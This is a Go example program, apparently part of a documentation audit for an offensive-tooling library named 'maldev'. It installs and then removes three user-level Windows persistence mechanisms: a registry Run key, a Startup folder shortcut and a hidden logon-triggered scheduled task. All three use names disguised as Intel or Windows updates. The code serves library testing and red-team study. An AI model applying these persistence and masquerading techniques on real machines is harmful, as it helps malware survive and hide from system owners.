//go:build windows

// persistence-user — panorama 5 of the doc-truth audit.
//
// Built strictly from the user-facing markdown:
//   - docs/techniques/persistence/registry.md      — HKCU\…\Run
//   - docs/techniques/persistence/startup-folder.md — Startup folder .lnk
//   - docs/techniques/persistence/task-scheduler.md — user-scope task
//
// Tests the three "no-admin" persistence vectors. Each install is paired
// with a Remove/Delete so the example leaves the system clean — easier
// to repeat across the matrix without polluting the INIT snapshot.
package main

import (
	"fmt"

	"github.com/oioio-space/maldev/persistence/registry"
	"github.com/oioio-space/maldev/persistence/scheduler"
	"github.com/oioio-space/maldev/persistence/startup"
)

func main() {
	const exePath = `C:\Users\Public\winupdate.exe`

	// 1. HKCU Run key (registry.md "Simple"). User-scope, no admin.
	fmt.Printf("=== Registry HKCU Run ===\n")
	if err := registry.Set(registry.HiveCurrentUser, registry.KeyRun,
		"IntelGraphicsUpdate", exePath); err != nil {
		fmt.Printf("Set: %v\n", err)
	} else {
		fmt.Printf("Set: OK\n")
	}
	if err := registry.Delete(registry.HiveCurrentUser, registry.KeyRun,
		"IntelGraphicsUpdate"); err != nil {
		fmt.Printf("Delete: %v\n", err)
	} else {
		fmt.Printf("Delete: OK\n")
	}

	// 2. Startup folder .lnk (startup-folder.md "Simple").
	fmt.Printf("\n=== Startup folder ===\n")
	if err := startup.Install("WindowsUpdate", exePath, "--silent"); err != nil {
		fmt.Printf("Install: %v\n", err)
	} else {
		fmt.Printf("Install: OK\n")
	}
	if err := startup.Remove("WindowsUpdate"); err != nil {
		fmt.Printf("Remove: %v\n", err)
	} else {
		fmt.Printf("Remove: OK\n")
	}

	// 3. Scheduled task (task-scheduler.md "Simple"). User-scope path.
	fmt.Printf("\n=== Scheduled task ===\n")
	if err := scheduler.Create(`\IntelGraphicsRefresh`,
		scheduler.WithAction(exePath),
		scheduler.WithTriggerLogon(),
		scheduler.WithHidden(),
	); err != nil {
		fmt.Printf("Create: %v\n", err)
	} else {
		fmt.Printf("Create: OK\n")
	}
	if err := scheduler.Delete(`\IntelGraphicsRefresh`); err != nil {
		fmt.Printf("Delete: %v\n", err)
	} else {
		fmt.Printf("Delete: OK\n")
	}
}
